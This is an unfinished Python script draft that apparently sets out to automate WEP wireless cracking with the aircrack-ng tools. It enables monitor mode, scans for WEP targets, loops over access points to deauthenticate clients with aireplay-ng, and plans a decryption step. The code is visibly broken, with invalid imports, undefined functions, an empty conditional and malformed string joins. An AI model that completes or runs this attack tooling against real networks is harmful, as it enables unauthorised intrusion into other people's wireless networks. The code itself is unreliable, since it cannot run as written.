'''For speed and accuracy try to make as automated as possible, a shell script for multiple types of intrusions, collisions and captures
Test for python3
Figure out the commands for terminal based wlan connections, perhaps on wicd
'''
import fileinput,sys,libtime                           ''' some time library to count down in seconds, fileinput to read in files, sys for various system cmds '''
import idFormating.py                                  #importing my things

filename = 'flagsCaptured-01.csv'
target_BSSID = '0'
source_BSSID = '0'
deauth_BSSID = '0'

'''step one: gather intel'''

print "airmon-ng start wlan0"
print "airodump-ng --encrypt WEP mon0"          '''the -w option for airodump-ng writes to a few files, be sure to overwrite these files upon multiple use,store data from each file in vars!!!!'''
print "^C"

'''
format the text of flagsCaptured-01.csv function:
remove useless BSSIDs function: ie targets with no deauth targets
count #of bssids function here:
'''

potential_flags = flags()                                                              #calls the function which grabs BSSID, deauth BSSIDs, and ESSID of all targets in range
BSSID_counter = len(potential_flags)

    '''step two: capture the flag'''
while (BSSID_counter > 0):
    target_BSSID = potential_flags[0][0] 
    i = 1
    while(len(potential_flags[0]) > 1):
      deauth_BSSID = potential_flags[0][i]                                               #Should be looped in case first deauth BSSID doesn't work
      #enter the deauth routine here
      if #deauth is succesful
        break
      i += 1
    print 'aireplay-ng -a ' target_BSSID ' -h ' source_BSSID ' mon0 '                  '-m for min length, -n for max length'
    
    '''step three: unencrypt the flag'''
    
    BSSID_counter = BSSID_counter - 1                                                  '''subtracts counter for finite loop'''
